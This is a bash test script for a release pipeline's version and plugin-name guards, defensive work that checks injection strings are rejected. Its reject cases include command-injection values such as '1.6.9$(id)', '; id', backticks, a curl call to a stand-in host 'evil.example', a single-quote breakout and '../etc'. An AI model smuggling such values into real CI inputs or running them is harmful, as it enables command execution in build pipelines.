#!/usr/bin/env bash
set -uo pipefail

# Tests the version-format guard in detect-all-changes.sh.
#
# The versions that script reads are echoed into GITHUB_OUTPUT and then
# interpolated with ${{ }} into `run:` blocks across the release pipeline.
# GitHub expands ${{ }} textually BEFORE the shell parses the line, so a version
# file containing command substitution would execute rather than be quoted. The
# guard rejects anything that is not a plain version string, at the one place the
# value enters the pipeline.
#
# detect-all-changes.sh cannot be sourced directly - it runs git queries and exits
# on its own - so this extracts the guard function from the real script and
# exercises that, rather than restating it here.
#
# Usage: ./version-format.test.sh

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TARGET="${SCRIPT_DIR}/detect-all-changes.sh"

for guard in validate_version validate_plugin_name; do
  if ! grep -q "^${guard}()" "$TARGET"; then
    echo "FAIL: detect-all-changes.sh defines no ${guard}() guard" >&2
    exit 1
  fi
done

# Extract just the function definitions, each up to its closing brace at column 0.
FN="$(awk '/^validate_version\(\)/,/^}/' "$TARGET")
$(awk '/^validate_plugin_name\(\)/,/^}/' "$TARGET")"

passed=0
failed=0

expect_accept() {
  if (eval "$FN"; validate_version "$1" "test") >/dev/null 2>&1; then
    echo "  ok - accepts $1"
    passed=$((passed + 1))
  else
    echo "FAIL: rejected a valid version: $1" >&2
    failed=$((failed + 1))
  fi
}

expect_reject() {
  if (eval "$FN"; validate_version "$1" "test") >/dev/null 2>&1; then
    echo "FAIL: accepted a malformed version: $1" >&2
    failed=$((failed + 1))
  else
    echo "  ok - rejects $1"
    passed=$((passed + 1))
  fi
}

# The shapes the repo actually ships. The prerelease forms are not hypothetical:
# `git tag` carries 38 of them, including the multi-hyphen
# transports/v1.5.0-prerelease3-ajhfix-base. A guard that rejected these would block
# a release, so they are pinned here.
expect_accept "1.6.9"
expect_accept "v1.6.9"
expect_accept "1.6.9-rc.1"
expect_accept "v2.0.0-beta1"
expect_accept "1.6.9-prerelease1"
expect_accept "1.6.9-prerelease2"
expect_accept "v2.0.0-prerelease1"
expect_accept "v1.5.0-prerelease3-ajhfix-base"
expect_accept "2.0.0-prerelease1+build.5"

# Injection shapes: each of these reaches a shell via ${{ }} textual expansion.
expect_reject '1.6.9$(id)'
expect_reject '1.6.9`id`'
expect_reject '1.6.9; id'
expect_reject '1.6.9 && id'
expect_reject '$(curl evil.example)'
expect_reject '1.6.9|id'
expect_reject '1.6.9
id'

# Plainly malformed values are rejected too.
expect_reject ""
expect_reject "not-a-version"

# Structure, not just characters. These are all shell-inert, so they are a
# correctness concern rather than an injection one - but a guard that advertises
# MAJOR.MINOR.PATCH and then accepts a fourth component or a letter inside the
# numeric part would let a bad version file reach tag construction unnoticed.
expect_reject "1x.2.3"
expect_reject "1.2.3rc1"
expect_reject "1.2.3.4"
expect_reject "1.2"
expect_reject "1.2.x"
expect_reject "v1.2"
expect_reject ".1.2.3"

# A separator that introduces nothing. Semantic Versioning 2.0.0 clauses 9 and 10 both
# say identifiers MUST NOT be empty, and its BNF has no production for a blank one, so
# these are malformed rather than merely untidy - and a trailing bare separator is the
# shape a truncated or partially-written version file takes.
expect_reject "1.2.3-"
expect_reject "1.2.3+"
expect_reject "v1.2.3-"
expect_reject "v1.2.3+"


# ---------------------------------------------------------------------------------
# Plugin names. These reach a shell too, and by a nastier route than the versions:
# they are collected into the changed-plugins JSON and interpolated at
# release-pipeline.yml as '${{ needs.detect-changes.outputs.changed-plugins }}'.
# jq -R escapes double quotes and backslashes when building that JSON, but NOT single
# quotes - and the interpolation sits inside single quotes in the shell, so a name
# carrying one closes the string.
# ---------------------------------------------------------------------------------

expect_name_accept() {
  if (eval "$FN"; validate_plugin_name "$1") >/dev/null 2>&1; then
    echo "  ok - accepts plugin name $1"
    passed=$((passed + 1))
  else
    echo "FAIL: rejected a real plugin name: $1" >&2
    failed=$((failed + 1))
  fi
}

expect_name_reject() {
  if (eval "$FN"; validate_plugin_name "$1") >/dev/null 2>&1; then
    echo "FAIL: accepted a malformed plugin name: $1" >&2
    failed=$((failed + 1))
  else
    echo "  ok - rejects plugin name $1"
    passed=$((passed + 1))
  fi
}

# Every plugin directory currently in the repo.
for real_name in compat governance jsonparser logging maxim mocker \
                 modelcatalogresolver otel prompts semanticcache telemetry test-reports; do
  expect_name_accept "$real_name"
done

# The single quote is the one that matters for the '...' interpolation site.
expect_name_reject "foo'; id; '"
expect_name_reject 'foo"; id'
expect_name_reject 'foo$(id)'
expect_name_reject 'foo`id`'
expect_name_reject "foo bar"
expect_name_reject "../etc"
expect_name_reject ""

echo ""
if [ "$failed" -ne 0 ]; then
  echo "$failed failed, $passed passed" >&2
  exit 1
fi
echo "$passed passed"
